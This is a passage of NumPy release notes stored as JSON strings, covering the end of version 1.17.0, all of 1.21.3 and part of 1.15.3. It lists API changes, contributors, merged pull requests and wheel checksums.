`fraction.Fraction` and `decimal.Decimal` objects\n- -------------------------------------------------------------------------\nIn general, this handles object arrays more gracefully, and avoids floating-\npoint operations if exact arithmetic types are used.\n\nSupport of object arrays in `matmul`\n- ------------------------------------\nIt is now possible to use `matmul` (or the ```` operator) with object arrays.\nFor instance, it is now possible to do::\n\n    from fractions import Fraction\n    a = np.array([[Fraction(1, 2), Fraction(1, 3)], [Fraction(1, 3), Fraction(1, 2)]])\n    b = a  a\n\n\nChanges\n=======\n\n`median` and `percentile` family of functions no longer warn about ``nan``\n- --------------------------------------------------------------------------\n`numpy.median`, `numpy.percentile`, and `numpy.quantile` used to emit a\n``RuntimeWarning`` when encountering an `nan`. Since they return the\n``nan`` value, the warning is redundant and has been removed.\n\n``timedelta64 % 0`` behavior adjusted to return ``NaT``\n- -------------------------------------------------------\nThe modulus operation with two ``np.timedelta64`` operands now returns\n``NaT`` in the case of division by zero, rather than returning zero\n\nNumPy functions now always support overrides with ``__array_function__``\n- ------------------------------------------------------------------------\nNumPy now always checks the ``__array_function__`` method to implement overrides\nof NumPy functions on non-NumPy arrays, as described in `NEP 18`_. The feature\nwas available for testing with NumPy 1.16 if appropriate environment variables\nare set, but is now always enabled.\n\n.. _`NEP 18` : http://www.numpy.org/neps/nep-0018-array-function-protocol.html\n\n``lib.recfunctions.structured_to_unstructured`` does not squeeze single-field views\n- -----------------------------------------------------------------------------------\nPreviously ``structured_to_unstructured(arr[['a']])`` would produce a squeezed\nresult inconsistent with ``structured_to_unstructured(arr[['a', b']])``. This\nwas accidental. The old behavior can be retained with\n``structured_to_unstructured(arr[['a']]).squeeze(axis=-1)`` or far more simply,\n``arr['a']``.\n\n`clip` now uses a ufunc under the hood\n- --------------------------------------\nThis means that registering clip functions for custom dtypes in C via\n``descr->f->fastclip`` is deprecated - they should use the ufunc registration\nmechanism instead, attaching to the ``np.core.umath.clip`` ufunc.\n\nIt also means that ``clip`` accepts ``where`` and ``casting`` arguments,\nand can be override with ``__array_ufunc__``.\n\nA consequence of this change is that some behaviors of the old ``clip`` have\nbeen deprecated:\n\n* Passing ``nan`` to mean \"do not clip\" as one or both bounds. This didn't work\n  in all cases anyway, and can be better handled by passing infinities of the\n  appropriate sign.\n* Using \"unsafe\" casting by default when an ``out`` argument is passed. Using\n  ``casting=\"unsafe\"`` explicitly will silence this warning.\n\nAdditionally, there are some corner cases with behavior changes:\n\n* Padding ``max < min`` has changed to be more consistent across dtypes, but\n  should not be relied upon.\n* Scalar ``min`` and ``max`` take part in promotion rules like they do in all\n  other ufuncs.\n\n``__array_interface__`` offset now works as documented\n- ------------------------------------------------------\nThe interface may use an ``offset`` value that was mistakenly ignored.\n\nPickle protocol in `savez` set to 3 for ``force zip64`` flag\n- -----------------------------------------------------------------\n`savez` was not using the ``force_zip64`` flag, which limited the size of\nthe archive to 2GB. But using the flag requires us to use pickle protocol 3 to\nwrite ``object`` arrays. The protocol used was bumped to 3, meaning the archive\nwill be unreadable by Python2.\n\nStructured arrays indexed with non-existent fields raise ``KeyError`` not ``ValueError``\n- ----------------------------------------------------------------------------------------\n``arr['bad_field']`` on a structured type raises ``KeyError``, for consistency\nwith ``dict['bad_field']``.\n\n\nChecksums\n=========\n\nMD5\n- ---\n\n    5ac469e3c2cd9b34c2a906d48544f491  numpy-1.17.0-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    526c60c36c61b7d30e6a50ffad3e81a2  numpy-1.17.0-cp35-cp35m-manylinux1_i686.whl\n    71066029b28fa03b897fd960be6dc6a9  numpy-1.17.0-cp35-cp35m-manylinux1_x86_64.whl\n    ab16f4b7f83e64113bf118ae3a9414b9  numpy-1.17.0-cp35-cp35m-win32.whl\n    e919d45495558d93275ef4ab724f767a  numpy-1.17.0-cp35-cp35m-win_amd64.whl\n    101e88a9870a5046536f71d77d0a7f5c  numpy-1.17.0-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    c996484b56aefecfe3626bcaca88a187  numpy-1.17.0-cp36-cp36m-manylinux1_i686.whl\n    4db1ecda4fbc202722774599cb434378  numpy-1.17.0-cp36-cp36m-manylinux1_x86_64.whl\n    feeecc8ea0bbc37b2f0be447b32a478f  numpy-1.17.0-cp36-cp36m-win32.whl\n    b7efb94a9cf4cc864ea546fb21a4d6bf  numpy-1.17.0-cp36-cp36m-win_amd64.whl\n    c6501eed55a840b2c81b211d6cf5065e  numpy-1.17.0-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    49ae9d7440e5dbabf3e02eba5b4bb8cd  numpy-1.17.0-cp37-cp37m-manylinux1_i686.whl\n    a245e8fc884fcd6ad1c53c322496cace  numpy-1.17.0-cp37-cp37m-manylinux1_x86_64.whl\n    0da9af1ac3832ae8b94f5fdce31c8c7d  numpy-1.17.0-cp37-cp37m-win32.whl\n    1ffa1bc110de363748a849a35126d9ff  numpy-1.17.0-cp37-cp37m-win_amd64.whl\n    c48b2ad785f82cdfe28c907ce35e2a71  numpy-1.17.0.tar.gz\n    aed49b31bcb44ec73b8155be78566135  numpy-1.17.0.zip\n\nSHA256\n- ------\n\n    910d2272403c2ea8a52d9159827dc9f7c27fb4b263749dca884e2e4a8af3b302  numpy-1.17.0-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    9ce8300950f2f1d29d0e49c28ebfff0d2f1e2a7444830fbb0b913c7c08f31511  numpy-1.17.0-cp35-cp35m-manylinux1_i686.whl\n    7724e9e31ee72389d522b88c0d4201f24edc34277999701ccd4a5392e7d8af61  numpy-1.17.0-cp35-cp35m-manylinux1_x86_64.whl\n    0cdd229a53d2720d21175012ab0599665f8c9588b3b8ffa6095dd7b90f0691dd  numpy-1.17.0-cp35-cp35m-win32.whl\n    5adfde7bd3ee4864536e230bcab1c673f866736698724d5d28c11a4d63672658  numpy-1.17.0-cp35-cp35m-win_amd64.whl\n    464b1c48baf49e8505b1bb754c47a013d2c305c5b14269b5c85ea0625b6a988a  numpy-1.17.0-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    eb0fc4a492cb896346c9e2c7a22eae3e766d407df3eb20f4ce027f23f76e4c54  numpy-1.17.0-cp36-cp36m-manylinux1_i686.whl\n    9588c6b4157f493edeb9378788dcd02cb9e6a6aeaa518b511a1c79d06cbd8094  numpy-1.17.0-cp36-cp36m-manylinux1_x86_64.whl\n    03e311b0a4c9f5755da7d52161280c6a78406c7be5c5cc7facfbcebb641efb7e  numpy-1.17.0-cp36-cp36m-win32.whl\n    c3ab2d835b95ccb59d11dfcd56eb0480daea57cdf95d686d22eff35584bc4554  numpy-1.17.0-cp36-cp36m-win_amd64.whl\n    f4e4612de60a4f1c4d06c8c2857cdcb2b8b5289189a12053f37d3f41f06c60d0  numpy-1.17.0-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    312bb18e95218bedc3563f26fcc9c1c6bfaaf9d453d15942c0839acdd7e4c473  numpy-1.17.0-cp37-cp37m-manylinux1_i686.whl\n    8d36f7c53ae741e23f54793ffefb2912340b800476eb0a831c6eb602e204c5c4  numpy-1.17.0-cp37-cp37m-manylinux1_x86_64.whl\n    ec0c56eae6cee6299f41e780a0280318a93db519bbb2906103c43f3e2be1206c  numpy-1.17.0-cp37-cp37m-win32.whl\n    be39cca66cc6806652da97103605c7b65ee4442c638f04ff064a7efd9a81d50a  numpy-1.17.0-cp37-cp37m-win_amd64.whl\n    47b7b6145e7ba5918ce26be25999b6d4b35cf9fbfdf46b7da50090ffdb020445  numpy-1.17.0.tar.gz\n    951fefe2fb73f84c620bec4e001e80a80ddaa1b84dce244ded7f1e0cbe0ed34a  numpy-1.17.0.zip\n-----BEGIN PGP SIGNATURE-----\n\niQEzBAEBCAAdFiEEU6DlKD8F4p1xKRSeZ58ig3fFJHsFAl07P9kACgkQZ58ig3fF\nJHsvxAf/Xd86xi9nEUJ6zivcQBbWLHlYHPp4eBCebXQvIuDNI5uXodVgLZksaxBD\nq1+oXHoUQD49EPKqeEfBjjhkrbnLxbONKdUYHZ/oZmDPg0tKK3jxyM2c1di45bII\n0jOQEwB/H0PrBvLTujCHljUBkPOdg28IyKHWE/TmfUBBb9yOASILSxAo9YlKM8tZ\nbIPwrDxHh1zTFH7AKWc4b5GAoM5gh1ZkfX8rL3Kq3v0VtR6O0qYYpu6DvAr5Yy4j\nP76a5eKcB8nsQ3HrdIV2tgreHYS2ViZX3bFzJDwb5z8d/RUthu7RrxEwjxX9ocLe\n7UoI63D+GXb0IwZd50SKwaVwPYQaaw==\n=Djve\n-----END PGP SIGNATURE-----\n\n\n.. currentmodule:: numpy\n\n=========================\n", "1.21.3": "==========================\n\nThe NumPy 1.21.3 is a maintenance release the fixes a few bugs discovered after\n1.21.2. It also provides 64 bit Python 3.10.0 wheels. Note a few oddities about\nPython 3.10:\n\n* There are no 32 bit wheels for Windows, Mac, or Linux.\n* The Mac Intel builds are only available in universal2 wheels.\n\nThe Python versions supported in this release are 3.7-3.10. If you want to\ncompile your own version using gcc-11 you will need to use gcc-11.2+ to avoid\nproblems.\n\nContributors\n============\n\nA total of 7 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Aaron Meurer\n* Bas van Beek\n* Charles Harris\n* Developer-Ecosystem-Engineering +\n* Kevin Sheppard\n* Sebastian Berg\n* Warren Weckesser\n\nPull requests merged\n====================\n\nA total of 8 pull requests were merged for this release.\n\n* `19745 <https://github.com/numpy/numpy/pull/19745>`__: ENH: Add dtype-support to 3 ```generic``/``ndarray`` methods\n* `19955 <https://github.com/numpy/numpy/pull/19955>`__: BUG: Resolve Divide by Zero on Apple silicon + test failures...\n* `19958 <https://github.com/numpy/numpy/pull/19958>`__: MAINT: Mark type-check-only ufunc subclasses as ufunc aliases...\n* `19994 <https://github.com/numpy/numpy/pull/19994>`__: BUG: np.tan(np.inf) test failure\n* `20080 <https://github.com/numpy/numpy/pull/20080>`__: BUG: Correct incorrect advance in PCG with emulated int128\n* `20081 <https://github.com/numpy/numpy/pull/20081>`__: BUG: Fix NaT handling in the PyArray_CompareFunc for datetime...\n* `20082 <https://github.com/numpy/numpy/pull/20082>`__: DOC: Ensure that we add documentation also as to the dict for...\n* `20106 <https://github.com/numpy/numpy/pull/20106>`__: BUG: core: result_type(0, np.timedelta64(4)) would seg. fault.\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    9acea9630856659ba48fdb582ecc37b4  numpy-1.21.3-cp310-cp310-macosx_10_9_universal2.whl\n    a70f80a4e74a3153a8307c4f0ea8d13d  numpy-1.21.3-cp310-cp310-macosx_11_0_arm64.whl\n    13cfe83efd261ea1c3d1eb02c1d3af83  numpy-1.21.3-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    8576bfd867834182269f72abbaa2e81e  numpy-1.21.3-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    8ac48f503f1e22c0c2b5d056772aca27  numpy-1.21.3-cp310-cp310-win_amd64.whl\n    cbe0d0d7623de3c2c7593f673d1a880a  numpy-1.21.3-cp37-cp37m-macosx_10_9_x86_64.whl\n    0967b18baba13e511c7eb48902a62b39  numpy-1.21.3-cp37-cp37m-manylinux_2_12_i686.manylinux2010_i686.whl\n    da54c9566f3e3f8c7d60efebfdf7e1ae  numpy-1.21.3-cp37-cp37m-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    0aa000f3c10cf74bf47770577384b5c8  numpy-1.21.3-cp37-cp37m-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    5683501bf91be25c53c52e3b083098c3  numpy-1.21.3-cp37-cp37m-manylinux_2_5_i686.manylinux1_i686.whl\n    89e15d979533f8a314e0ab0648ee7153  numpy-1.21.3-cp37-cp37m-manylinux_2_5_x86_64.manylinux1_x86_64.whl\n    a093fea475b5ed18bd21b3c79e68e388  numpy-1.21.3-cp37-cp37m-win32.whl\n    f906001213ed0902b1aecfaa12224e94  numpy-1.21.3-cp37-cp37m-win_amd64.whl\n    88a2cd378412220d618473dd273baf04  numpy-1.21.3-cp38-cp38-macosx_10_9_universal2.whl\n    1bc55202f604e30f338bc2ed27b561bc  numpy-1.21.3-cp38-cp38-macosx_10_9_x86_64.whl\n    9555dc6de8748958434e8f2feba98494  numpy-1.21.3-cp38-cp38-macosx_11_0_arm64.whl\n    93ad32cc87866e9242156bdadc61e5f5  numpy-1.21.3-cp38-cp38-manylinux_2_12_i686.manylinux2010_i686.whl\n    7cb0b7dd6aee667ecdccae1829260186  numpy-1.21.3-cp38-cp38-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    34e6f5f9e9534ef8772f024170c2bd2d  numpy-1.21.3-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    54e6abfb8f600de2ccd1649b1fca820b  numpy-1.21.3-cp38-cp38-manylinux_2_5_i686.manylinux1_i686.whl\n    260ba58f2dc64e779eac7318ec92f36c  numpy-1.21.3-cp38-cp38-manylinux_2_5_x86_64.manylinux1_x86_64.whl\n    889202c6bdaf8c1ae0803925e9e1a8f7  numpy-1.21.3-cp38-cp38-win32.whl\n    980303a7e6317faf9a56ba8fc80795d9  numpy-1.21.3-cp38-cp38-win_amd64.whl\n    44d6bd26fb910710ab4002d0028c9020  numpy-1.21.3-cp39-cp39-macosx_10_9_universal2.whl\n    6f5b02152bd0b08a77b79657788ce59c  numpy-1.21.3-cp39-cp39-macosx_10_9_x86_64.whl\n    ad05d5c412d15e7880cd65cc6cdd4aac  numpy-1.21.3-cp39-cp39-macosx_11_0_arm64.whl\n    5b61a91221931af4a78c3bd20925a91f  numpy-1.21.3-cp39-cp39-manylinux_2_12_i686.manylinux2010_i686.whl\n    df7344ae04c5a54249fa1b63a256ce61  numpy-1.21.3-cp39-cp39-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    c653a096da47b64b42e8f1536a21f7d4  numpy-1.21.3-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    e0d35451ba1c37f96e032bc6f75ccdf7  numpy-1.21.3-cp39-cp39-win32.whl\n    b2e1dc59b6fa224ce11728d94be740a6  numpy-1.21.3-cp39-cp39-win_amd64.whl\n    8ce925a0fcbc1062985026215d369276  numpy-1.21.3-pp37-pypy37_pp73-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    b8e6b7165f105bde0b45cd9ae34bfe20  numpy-1.21.3.tar.gz\n    59d986f5ccf3edfb7d4d14949c6666ed  numpy-1.21.3.zip\n\nSHA256\n------\n::\n\n    508b0b513fa1266875524ba8a9ecc27b02ad771fe1704a16314dc1a816a68737  numpy-1.21.3-cp310-cp310-macosx_10_9_universal2.whl\n    5dfe9d6a4c39b8b6edd7990091fea4f852888e41919d0e6722fe78dd421db0eb  numpy-1.21.3-cp310-cp310-macosx_11_0_arm64.whl\n    8a10968963640e75cc0193e1847616ab4c718e83b6938ae74dea44953950f6b7  numpy-1.21.3-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    49c6249260890e05b8111ebfc391ed58b3cb4b33e63197b2ec7f776e45330721  numpy-1.21.3-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    f8f4625536926a155b80ad2bbff44f8cc59e9f2ad14cdda7acf4c135b4dc8ff2  numpy-1.21.3-cp310-cp310-win_amd64.whl\n    e54af82d68ef8255535a6cdb353f55d6b8cf418a83e2be3569243787a4f4866f  numpy-1.21.3-cp37-cp37m-macosx_10_9_x86_64.whl\n    f41b018f126aac18583956c54544db437f25c7ee4794bcb23eb38bef8e5e192a  numpy-1.21.3-cp37-cp37m-manylinux_2_12_i686.manylinux2010_i686.whl\n    50cd26b0cf6664cb3b3dd161ba0a09c9c1343db064e7c69f9f8b551f5104d654  numpy-1.21.3-cp37-cp37m-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    4cc9b512e9fb590797474f58b7f6d1f1b654b3a94f4fa8558b48ca8b3cfc97cf  numpy-1.21.3-cp37-cp37m-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    88a5d6b268e9ad18f3533e184744acdaa2e913b13148160b1152300c949bbb5f  numpy-1.21.3-cp37-cp37m-manylinux_2_5_i686.manylinux1_i686.whl\n    3c09418a14471c7ae69ba682e2428cae5b4420a766659605566c0fa6987f6b7e  numpy-1.21.3-cp37-cp37m-manylinux_2_5_x86_64.manylinux1_x86_64.whl\n    90bec6a86b348b4559b6482e2b684db4a9a7eed1fa054b86115a48d58fbbf62a  numpy-1.21.3-cp37-cp37m-win32.whl\n    043e83bfc274649c82a6f09836943e4a4aebe5e33656271c7dbf9621dd58b8ec  numpy-1.21.3-cp37-cp37m-win_amd64.whl\n    75621882d2230ab77fb6a03d4cbccd2038511491076e7964ef87306623aa5272  numpy-1.21.3-cp38-cp38-macosx_10_9_universal2.whl\n    188031f833bbb623637e66006cf75e933e00e7231f67e2b45cf8189612bb5dc3  numpy-1.21.3-cp38-cp38-macosx_10_9_x86_64.whl\n    160ccc1bed3a8371bf0d760971f09bfe80a3e18646620e9ded0ad159d9749baa  numpy-1.21.3-cp38-cp38-macosx_11_0_arm64.whl\n    29fb3dcd0468b7715f8ce2c0c2d9bbbaf5ae686334951343a41bd8d155c6ea27  numpy-1.21.3-cp38-cp38-manylinux_2_12_i686.manylinux2010_i686.whl\n    32437f0b275c1d09d9c3add782516413e98cd7c09e6baf4715cbce781fc29912  numpy-1.21.3-cp38-cp38-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    e606e6316911471c8d9b4618e082635cfe98876007556e89ce03d52ff5e8fcf0  numpy-1.21.3-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    a99a6b067e5190ac6d12005a4d85aa6227c5606fa93211f86b1dafb16233e57d  numpy-1.21.3-cp38-cp38-manylinux_2_5_i686.manylinux1_i686.whl\n    dde972a1e11bb7b702ed0e447953e7617723760f420decb97305e66fb4afc54f  numpy-1.21.3-cp38-cp38-manylinux_2_5_x86_64.manylinux1_x86_64.whl\n    fe52dbe47d9deb69b05084abd4b0df7abb39a3c51957c09f635520abd49b29dd  numpy-1.21.3-cp38-cp38-win32.whl\n    75eb7cadc8da49302f5b659d40ba4f6d94d5045fbd9569c9d058e77b0514c9e4  numpy-1.21.3-cp38-cp38-win_amd64.whl\n    2a6ee9620061b2a722749b391c0d80a0e2ae97290f1b32e28d5a362e21941ee4  numpy-1.21.3-cp39-cp39-macosx_10_9_universal2.whl\n    5c4193f70f8069550a1788bd0cd3268ab7d3a2b70583dfe3b2e7f421e9aace06  numpy-1.21.3-cp39-cp39-macosx_10_9_x86_64.whl\n    28f15209fb535dd4c504a7762d3bc440779b0e37d50ed810ced209e5cea60d96  numpy-1.21.3-cp39-cp39-macosx_11_0_arm64.whl\n    c6c2d535a7beb1f8790aaa98fd089ceab2e3dd7ca48aca0af7dc60e6ef93ffe1  numpy-1.21.3-cp39-cp39-manylinux_2_12_i686.manylinux2010_i686.whl\n    bffa2eee3b87376cc6b31eee36d05349571c236d1de1175b804b348dc0941e3f  numpy-1.21.3-cp39-cp39-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    cc14e7519fab2a4ed87d31f99c31a3796e4e1fe63a86ebdd1c5a1ea78ebd5896  numpy-1.21.3-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    dd0482f3fc547f1b1b5d6a8b8e08f63fdc250c58ce688dedd8851e6e26cff0f3  numpy-1.21.3-cp39-cp39-win32.whl\n    300321e3985c968e3ae7fbda187237b225f3ffe6528395a5b7a5407f73cf093e  numpy-1.21.3-cp39-cp39-win_amd64.whl\n    98339aa9911853f131de11010f6dd94c8cec254d3d1f7261528c3b3e3219f139  numpy-1.21.3-pp37-pypy37_pp73-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    d0bba24083c01ae43457514d875f10d9ce4c1125d55b1e2573277b2410f2d068  numpy-1.21.3.tar.gz\n    63571bb7897a584ca3249c86dd01c10bcb5fe4296e3568b2e9c1a55356b6410e  numpy-1.21.3.zip\n\n\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA1\n\n==========================\n", "1.15.3": "==========================\n\nThis is a bugfix release for bugs and regressions reported following the 1.15.2\nrelease.  The Python versions supported by this release are 2.7, 3.4-3.7. The\nwheels are linked with OpenBLAS v0.3.0, which should fix some of the linalg\nproblems reported for NumPy 1.14.\n\nCompatibility Note\n==================\n\nThe NumPy 1.15.x OS X wheels released on PyPI no longer contain 32-bit\nbinaries.  That will also be the case in future releases. See\n`11625 <https://github.com/numpy/numpy/issues/11625>`__ for the related\ndiscussion.  Those needing 32-bit support should look elsewhere or build\nfrom source.\n\nContributors\n============\n\nA total of 7 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Allan Haldane\n* Charles Harris\n* Jeroen Demeyer\n* Kevin Sheppard\n* Matthew Bowden +\n* Matti Picus\n* Tyler Reddy\n\nPull requests merged\n====================\n\nA total of 12 pull requests were merged for this release.\n\n* `12080 <https://github.com/numpy/numpy/pull/12080>`__: MAINT: Blacklist some MSVC complex functions.\n* `12083 <https://github.com/numpy/numpy/pull/12083>`__: TST: Add azure CI testing to 1.15.x branch.\n* `12084 <https://github.com/numpy/numpy/pull/12084>`__: BUG: test_path() now uses Path.resolve()\n* `12085 <https://github.com/numpy/numpy/pull/12085>`__: TST, MAINT: Fix some failing tests on azure-pipelines mac and...\n* `12187 <https://github.com/numpy/numpy/pull/12187>`__: BUG: Fix memory leak in mapping.c\n* `12188 <https://github.com/numpy/numpy/pull/12188>`__: BUG: Allow boolean subtract in histogram\n* `12189 <https://github.com/numpy/numpy/pull/12189>`__: BUG: Fix in-place permutation\n* `12190 <https://github.com/numpy/numpy/pull/12190>`__: BUG: limit default for get_num_build_jobs() to 8\n* `12191 <https://github.com/numpy/numpy/pull/12191>`__: BUG: OBJECT_to_* should check for errors\n* `12192 <https://github.com/numpy/numpy/pull/12192>`__: DOC: Prepare for NumPy 1.15.3 release.\n* `12237 <https://github.com/numpy/numpy/pull/12237>`__: BUG: Fix MaskedArray fill_value type conversion.\n* `12238 <https://github.com/numpy/numpy/pull/12238>`__: TST: Backport azure-pipeline testing fixes for Mac\n\nChecksums\n=========\n\nMD5\n- ---\n\n    fc1ae8356a65804d02e5c7d9c1c07f65  numpy-1.15.3-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    85faf750ff68d76dad812eb6410cc417  numpy-1.15.3-cp27-cp27m-manylinux1_i686.whl\n    6d92d50f6235501475b642fc35212ad7  numpy-1.15.3-cp27-cp27m-manylinux1_x86_64.whl\n    f7430f4ca8d179a9e34072c0d1c1ca9c  numpy-1.15.3-cp27-cp27mu-manylinux1_i686.whl\n    ebd394af280ee41b55add821f84dc180  numpy-1.15.3-cp27-cp27mu-manylinux1_x86_64.whl\n    3bac2fd14dc19c20a0ced77bb8c395de  numpy-1.15.3-cp27-none-win32.whl\n    da69a44d0292379a261f1bf33b2afe3e  numpy-1.15.3-cp27-none-win_amd64.whl\n    c021f69eeed541202947d11c0ec3c2f4  numpy-1.15.3-cp34-cp34m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    4c2a4a7685c7431937aa0b5e6425b7de  numpy-1.15.3-cp34-cp34m-manylinux1_i686.whl\n    2eb4e845844b91853743bb4d4316e237  numpy-1.15.3-cp34-cp34m-manylinux1_x86_64.whl\n    47b03a3e34152c7e1ae7056f672674a5  numpy-1.15.3-cp34-none-win32.whl\n    64ebc4e0a722e5a6f1bd697309c3f951  numpy-1.15.3-cp34-none-win_amd64.whl\n    f7a9b021b45372fa39e009ae396d6108  numpy-1.15.3-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    7a7578978757cb69507ab680a2f9b8f3  numpy-1.15.3-cp35-cp35m-manylinux1_i686.whl\n    52d5bd16e06561e735cb7f461370e697  numpy-1.15.3-cp35-cp35m-manylinux1_x86_64.whl\n    c1421e59a425b6cd1307a45612c4911f  numpy-1.15.3-cp35-none-win32.whl\n    2ea2c18feb7f92ebd6b64261265d1b7f  numpy-1.15.3-cp35-none-win_amd64.whl\n    ed7b1d79ad554f59c65b6c2d15924624  numpy-1.15.3-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    bece3ef7768bfa7b354b8d1014aa85b3  numpy-1.15.3-cp36-cp36m-manylinux1_i686.whl\n    4ed669d22449b6e1759b320ff9b37eb7  numpy-1.15.3-cp36-cp36m-manylinux1_x86_64.whl\n    a3c7ce17e1fdf009950f2f41adcde29b  numpy-1.15.3-cp36-none-win32.whl\n    890f23c488a00a2c64578bcb3737533e  numpy-1.15.3-cp36-none-win_amd64.whl\n    c3a332b97d53c60d8c129a1a8e062652  numpy-1.15.3-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    096f70a3a147a596a9317ce8ac9bf1bd  numpy-1.15.3-cp37-cp37m-manylinux1_i686.whl\n    2317122b49e79ffad91250a428ca54f9  numpy-1.15.3-cp37-cp37m-manylinux1_x86_64.whl\n    2719106f42758fd285bce25fa3c1a78e  numpy-1.15.3-cp37-none-win32.whl\n    9a692a2bbcbaabf98f19fbd9c0c5c163  numpy-1.15.3-cp37-none-win_amd64.whl\n    274dd6db3a13c6b6c47a05b5365e1749  numpy-1.15.3.tar.gz\n    7f1b9e521c2a662cecf3708026e8bdad  numpy-1.15.3.zip\n\nSHA256\n- ------\n\n    3c7959f750b54b445f14962a3ddc41b9eadbab00b86da55fbb1967b2b79aad10  numpy-1.15.3-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    9d1598573d310104acb90377f0a8c2319f737084689f5eb18012becaf345cda5  numpy-1.15.3-cp27-cp27m-manylinux1_i686.whl\n    a988db28f54e104a01e8573ceb6f28202b4c15635b1450b2e3b2b822c6564f9b  numpy-1.15.3-cp27-cp27m-manylinux1_x86_64.whl\n    3d8f9273c763a139a99e65c2a3c10f1109df30bedae7f011b10d95c538364704  numpy-1.15.3-cp27-cp27mu-manylinux1_i686.whl\n    919f65e0732195474897b1cafefb4d4e7c2bb8174a725e506b62e9096e4df28d  numpy-1.15.3-cp27-cp27mu-manylinux1_x86_64.whl\n    d263f8f14f2da0c079c0297e829e550d8f2c4e0ffef215506bd1d0ddd2bff3de  numpy-1.15.3-cp27-none-win32.whl\n    b12fe6f31babb9477aa0f9692730654b3ee0e71f33b4568170dfafd439caf0a2  numpy-1.15.3-cp27-none-win_amd64.whl\n    febd31cd0d2fd2509ca2ec53cb339f8bf593c1bd245b9fc55c1917a68532a0af  numpy-1.15.3-cp34-cp34m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    d0f36a24cf8061a2c03e151be3418146717505b9b4ec17502fa3bbdb04ec1431  numpy-1.15.3-cp34-cp34m-manylinux1_i686.whl\n    63bca71691339d2d6f8a7c970821f2b12098a53afccc0190d4e1555e75e5223a  numpy-1.15.3-cp34-cp34m-manylinux1_x86_64.whl\n    b7599ff4acd23f5de983e3aec772153b1043e131487a5c6ad0f94b41a828877a  numpy-1.15.3-cp34-none-win32.whl\n    c9f4dafd6065c4c782be84cd67ceeb9b1d4380af60a7af32be10ebecd723385e  numpy-1.15.3-cp34-none-win_amd64.whl\n    32a07241cb624e104b88b08dea2851bf4ec5d65a1f599d7735041ced7171fd7a  numpy-1.15.3-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    8bc4b92a273659e44ca3f3a2f8786cfa39d8302223bcfe7df794429c63d5f5a1  numpy-1.15.3-cp35-cp35m-manylinux1_i686.whl\n    2f5ebc7a04885c7d69e5daa05208faef4db7f1ae6a99f4d36962df8cd54cdc76  numpy-1.15.3-cp35-cp35m-manylinux1_x86_64.whl\n    ce3622b73ccd844ba301c1aea65d36cf9d8331e7c25c16b1725d0f14db99aaf4  numpy-1.15.3-cp35-none-win32.whl\n    9fff90c88bfaad2901be50453d5cd7897a826c1d901f0654ee1d73ab3a48cd18  numpy-1.15.3-cp35-none-win_amd64.whl\n    032df9b6571c5f1d41ea6f6a189223208cb488990373aa686aca55570fcccb42  numpy-1.15.3-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    866a7c8774ccc7d603667fad95456b4cf56d79a2bb5a7648ac9f0082e0b9416e  numpy-1.15.3-cp36-cp36m-manylinux1_i686.whl\n    7ae9c3baff3b989859c88e0168ad10902118595b996bf781eaf011bb72428798  numpy-1.15.3-cp36-cp36m-manylinux1_x86_64.whl\n    d8837ff272800668aabdfe70b966631914b0d6513aed4fc1b1428446f771834d  numpy-1.15.3-cp36-none-win32.whl\n    